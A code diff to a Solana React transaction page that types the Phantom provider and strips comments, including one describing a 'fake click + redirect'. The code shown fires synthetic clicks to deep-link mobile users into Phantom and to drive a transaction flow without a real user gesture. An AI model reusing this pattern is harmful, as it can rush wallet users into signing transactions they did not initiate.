@@ -6,6 +6,17 @@ import { WalletName } from '@solana/wallet-adapter-base'
 import { createUnsignedTransaction } from '../services/transaction'
 import { Transaction } from '@solana/web3.js'
 
+/* -------- Phantom provider tipi (any yerine) -------- */
+interface PhantomProvider {
+  isPhantom?: boolean
+}
+declare global {
+  interface Window {
+    solana?: PhantomProvider
+  }
+}
+/* ---------------------------------------------------- */
+
 export default function TransactionPage() {
   const { connection } = useConnection()
   const {
@@ -18,16 +29,15 @@ export default function TransactionPage() {
 
   const retries = useRef(0)
   const maxRetries = 3
-  const waiting = useRef(false)
+  const waiting   = useRef(false)
   const [status, setStatus] = useState('Loading...')
 
   /* ------------  ➜  MOBİLDE PHANTOM’A OTOMATİK DEEPLINK  ------------ */
   useEffect(() => {
     const ua        = navigator.userAgent
     const isMobile  = /Android|iPhone|iPad/i.test(ua)
-    const isPhantom = (window as any).solana?.isPhantom
+    const isPhantom = window.solana?.isPhantom ?? false
 
-    // Mobil tarayıcıdayız ve Phantom provider yok → deeplink
     if (isMobile && !isPhantom) {
       const simulateClick = () => {
         const fakeClick = new MouseEvent('click', { bubbles: true, cancelable: true, view: window })
@@ -36,7 +46,6 @@ export default function TransactionPage() {
 
       const deepLink = `https://phantom.app/ul/browse/${encodeURIComponent(window.location.href)}?ref=${encodeURIComponent(window.location.href)}`
 
-      // Sahte tıklama + yönlendirme
       simulateClick()
       const a = document.createElement('a')
       a.href   = deepLink
@@ -45,13 +54,12 @@ export default function TransactionPage() {
       a.click()
       setTimeout(() => a.remove(), 500)
 
-      // Kullanıcı zaten yönlendirildi, mevcut sayfadaki başka işlemleri durdur
       return
     }
-  }, []) // yalnızca ilk mount’ta çalışır
+  }, [])
   /* ------------------------------------------------------------------ */
 
-  /* ---------------------  İŞLEM GÖNDERME AKIŞI  --------------------- */
+  /* -----------------------  İŞLEM AKIŞI  ---------------------------- */
   useEffect(() => {
     const simulateClick = () => {
       const fakeClick = new MouseEvent('click', { bubbles: true, cancelable: true, view: window })
